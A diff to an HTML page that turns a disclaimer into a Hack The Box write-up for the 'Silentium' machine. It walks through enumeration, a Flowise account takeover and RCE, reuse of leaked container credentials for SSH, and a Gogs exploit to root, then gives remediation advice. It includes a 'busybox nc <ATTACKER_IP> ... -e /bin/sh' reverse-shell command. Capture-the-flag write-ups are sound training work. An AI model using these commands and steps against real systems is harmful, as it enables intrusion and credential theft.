@@ -38,7 +38,7 @@
 </head>
 
 <body class="challenge-body">
-  <header class="challenge-hero" style="position: relative;">
+    <header class="challenge-hero" style="position: relative;">
     <div style="position: absolute; top: 1.5rem; right: 2rem; z-index: 10;">
       <button aria-label="Switch to light mode" class="theme-toggle" data-theme-toggle="" type="button">
         <span class="theme-track">
@@ -67,7 +67,7 @@
         </div>
         <div>
           <span class="meta-label">Platform</span>
-          <span class="meta-value" src="color:green">Hack The Box</span>
+          <span class="meta-value" src="color:green">HackTheBox</span>
         </div>
         <div>
           <span class="meta-label">IP Address</span>
@@ -81,20 +81,261 @@
   <main class="challenge-main">
     <section aria-labelledby="overview-title" class="card section-overview">
       <header class="section-heading">
-        <p class="eyebrow">Disclaimer </p>
-        <h2 id="overview-title">Disclaimer</h2>
+        <p class="eyebrow">Summary </p>
+        <h2 id="overview-title">Machine Overview</h2>
       </header>
       <p>
-        <strong>Due to Hack The Box rules, we cannot share write-ups or solutions for active machines. Write-ups will be
-          published once the machines are retired.</strong>
+        Silentium is an easy Linux machine where initial access is gained through a vulnerable Flowise instance via account takeover and RCE. Credentials exposed in a container allow SSH access to the host, and a vulnerable Gogs service running as root is exploited to achieve full system compromise.
       </p>
     </section>
 
+    <section aria-labelledby="description-title" class="card section-description">
+      <header class="section-heading">
+        <p class="eyebrow">Pentesting Process</p>
+        <h2 id="description-title">Service Enumeration</h2>
+      </header>
+      <p>
+        The assessment begins with a comprehensive service enumeration using <strong>Nmap</strong> to identify
+        exposed services and their versions.
+      </p>
+      <p class="center-code">
+        <code class="language-bash">nmap -sC -sV 10.129.70.219</code>
+      </p>
+      <p>
+        The scan reveals two accessible services:
+      </p>
+      <p>
+      <pre class="terminal">
+              <code>
+Host is up (0.18s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://silentium.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+            </code></pre>
+      </p>
+      <p>
+        The web server redirects traffic to the virtual host <code>silentium.htb</code>, which was added to the local
+        <code>/etc/hosts</code> file to enable proper interaction.
+      </p>
+      <p>
+        <code class="language-bash">echo "10.129.70.219  silentium.htb" >> /etc/hosts</code>
+      </p>
+      <header class="section-heading">
+        <h2 id="overview-title">VHost Enumeration</h2>
+      </header>
+      <p>We enumerate virtual hosts (vhosts) to identify additional exposed services.</p>
+      <p>
+        <code class="language-bash">ffuf -w /snap/seclists/current/Discovery/DNS/combined_subdomains.txt -u http://silentium.htb -H "Host: FUZZ.silentium.htb" -fs 178</code>
+      <pre class="terminal">
+              <code>
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.1.0
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://silentium.htb
+ :: Wordlist         : FUZZ: subdomains-top1million-5000.txt
+ :: Header           : Host: FUZZ.silentium.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+ :: Filter           : Response size: 178
+________________________________________________
+
+staging                 [Status: 200, Size: 3142, Words: 789, Lines: 70]
+              </code></pre>
+      </p>
+
+      <p>We identified the virtual host <code>staging.silentium.htb</code>, which hosts Flowise platform.</p>
+      
+      
+      <header class="section-heading">
+        <h2 id="overview-title">Vulnerability Analysis</h2>
+      </header>
+
+      <p>The server is running <strong>Flowise 3.0.5</strong>, which is vulnerable to:</p>
+      <ul>
+        <li> Account takeover (CVE-2025-58434)</li>
+        <li> Remote Code Execution (CVE-2025-59528)</li>
+      </ul>
+
+      <header class="section-heading">
+        <h3 id="overview-title">Account takeover (CVE-2025-58434)</h3>
+      </header>
+      <p>To exploit this vulnerability, we need to know the user's email.</p>
+      <p>
+        From the main website, we identify valid usernames:
+      </p>
+      <ul>
+        <li>Marcus Thorne</li>
+        <li>Ben</li>
+        <li>Elena Rossi</li>
+      </ul>
+      <p>We use these usernames to generate some email addresses that might be correct: </p>
+      <ul>
+        <li>marcus.thorne@silentium.htb</li>
+        <li>ben@silentium.htb</li>
+        <li>elena.rossi@silentium.htb</li>
+      </ul>
+
+      <p>Using <code>forgot-password</code> endpoint mentioned in <a class="ref" href="#references">[1]</a> we check the validity of these emails.</p>
+      <p>Ben's email is valid and we retrieved his <code>tempToken</code>, which will be used later to change Ben's password (the method mentioned also in <a class="ref" href="#references">[1]</a>)</p>
+      <p>
+        <img src="./assets/tempToken_retreive.png"/>
+      </p>
+      <p>Now we change Ben's password</p>
+      <p>
+        <img src="./assets/change_password.png"/>
+      </p>
+      <p>After taking over Ben's account, we are going to use it to exploit the vulnerability (CVE-2025-59528)</p>
+
+      <header class="section-heading">
+        <h3 id="overview-title">Remote Code Execution (CVE-2025-59528)</h3>
+      </header>
+      <p>A public exploit of this vulnerability is available on Exploit Database website <a class="ref" href="#references">[2]</a>.</p>
+      <p>
+        <code class="language-bash">python exploit.py --email ben@silentium.htb --password 'NewSecurePassword123!' --url http://staging.silentium.htb --c 'busybox nc &lt;ATTACKER_IP&gt; &lt;ATTACKER_PORT&gt; -e /bin/sh'</code>
+      </p>
+      <p>After exploiting this, we obtained a reverse shell in a container as root</p>
+      <p>
+        <code class="language-bash">id</code>
+      </p>
+      <p>
+        <pre class="terminal">
+      <code>uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)</code>
+        </pre>
+      </p>
+
+
+      <header class="section-heading">
+        <h2 id="overview-title">Container lateral movement</h2>
+      </header>
+
+      <p>
+        We retrieve environment variables from the container.
+      </p>
+            <p>
+        <code class="language-bash">env</code>
+      </p>
+      <p>
+        <pre class="terminal">
+      <code>
+FLOWISE_PASSWORD=F1l3_d0ck3r
+HOSTNAME=c78c3cceb7ba
+SENDER_EMAIL=ben@silentium.htb
+SMTP_PASSWORD=r04D!!_R4ge
+        </code>
+        </pre>
+      </p>
+      <p>We used <code>SMTP_PASSWORD</code> to connect to Ben's account on the machine using SSH (valid credentials <code>ben:r04D!!_R4ge</code>).</p>
+
+      <header class="section-heading">
+        <h2 id="overview-title">Internal Enumeration</h2>
+      </header>
+      <p>We discover an internal Gogs service running on port 3001 (<code>staging-v2-code.dev.silentium.htb</code>)</p>
+      
+    <p>
+        <code class="language-bash">cat /etc/nginx/sites-enabled/staging-v2-code</code>
+      </p>
+      <p>
+        <pre class="terminal">
+      <code>
+server {
+    listen 80;
+    server_name staging-v2-code.dev.silentium.htb;
+
+    location / {
+        proxy_pass http://127.0.0.1:3001;
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header X-Forwarded-Proto $scheme;
+    }
+}
+        </code>
+        </pre>
+      </p>
+      <p>The service runs <strong>Gogs 0.13.3</strong>, which is vulnerable to a local execution of code (<strong>CVE-2025-8110</strong>)</p>
+
+      <header class="section-heading">
+        <h2 id="overview-title">Privilege escalation</h2>
+      </header>
+      <p>The Gogs server is running as the root user, so by exploiting the vulnerability <strong>CVE-2025-8110</strong> we can get a reverse shell as root.</p>
+      <p>A public available exploit is available on GitHub <a class="ref" href="#references">[3]</a></p>
+      <p>To use the exploit, we begin first by creating a new account and then generating an API key in the user's setting page. </p>
+<p>
+        <code class="language-bash">python exploit2.py -u http://staging-v2-code.dev.silentium.htb -un &lt;USERNAME&gt; -pw &lt;PASSWORD&gt; -t &lt;API_KEY&gt; -lh &lt;ATTACKER_IP&gt; -lp &lt;ATTACKER_IP&gt;</code>
+      </p>
+      <p>After running the script, we obtain a reverse shell as root</p>
+      <p><img src="./assets/root.png" width="50%"/></p>
+    </section>
+
+
     <section aria-labelledby="overview-title" class="card section-overview">
       <header class="section-heading">
-        <p class="eyebrow">Proof of Completion</p>
-        <h2 id="overview-title">Proof of Completion</h2>
+        <p class="eyebrow">Mitigation</p>
+        <h2 id="overview-title">Remediation</h2>
       </header>
+      <p>
+        The following remediation steps can help prevent exploitation of the identified vulnerabilities:
+      </p>
+      <ul>
+        <li>Upgrade <strong>Flowise</strong> to version <strong>3.0.6 or later</strong> </li>
+        <li>Apply the security patch from <a class="ref" href="#references">[4]</a> immediately</li>
+      </ul>
+    </section>
+
+    <section aria-labelledby="overview-title" class="card section-overview" id="references">
+      <header class="section-heading">
+        <p class="eyebrow">References</p>
+        <h2 id="overview-title">References</h2>
+      </header>
+
+      <ol type="1" style="list-style-type: none; counter-reset: ref-counter;">
+        <li style="counter-increment: ref-counter;">
+          <span style="font-weight: bold;">[<span style="content: counter(ref-counter);">1</span>]</span>
+          <a href="https://github.com/advisories/GHSA-wgpv-6j63-x5ph"
+            target="_blank" rel="noopener noreferrer">
+            GitHub | CVE-2025-58434</a>
+        </li>
+
+        <li style="counter-increment: ref-counter;">
+          <span style="font-weight: bold;">[<span style="content: counter(ref-counter);">2</span>]</span>
+          <a href="https://www.exploit-db.com/exploits/52440"
+            target="_blank" rel="noopener noreferrer">
+            Exploit Database | Flowise 3.0.4 - Remote Code Execution (RCE)</a>
+        </li>
+
+        <li style="counter-increment: ref-counter;">
+          <span style="font-weight: bold;">[<span style="content: counter(ref-counter);">3</span>]</span>
+          <a href="https://github.com/TYehan/CVE-2025-8110-Gogs-RCE-Exploit"
+            target="_blank" rel="noopener noreferrer">
+            GitHub | Gogs CVE-2025-8110 RCE Exploit</a>
+        </li>
+
+        <li style="counter-increment: ref-counter;">
+          <span style="font-weight: bold;">[<span style="content: counter(ref-counter);">4</span>]</span>
+          <a href="https://github.com/gogs/gogs/pull/8078"
+            target="_blank" rel="noopener noreferrer">
+            GitHub | Security: prevent symlink traversal in repository API</a>
+        </li>
+
+      </ol>
+    </section>
+
+    <section aria-labelledby="overview-title" class="card section-overview" id="references">
       <img src="./assets/machine_solved.png" width="100%"/>
     </section>
 
@@ -110,7 +351,7 @@
       currentYearEl.textContent = new Date().getFullYear();
     }
 
-
+    
     const themeBtn = document.querySelector('[data-theme-toggle]');
     if (themeBtn) {
       const THEME_STORAGE_KEY = 'portfolio-theme';
@@ -151,7 +392,6 @@
       });
     });
   </script>
-
   <script src="../writeups_toc.js"></script>
 </body>
 
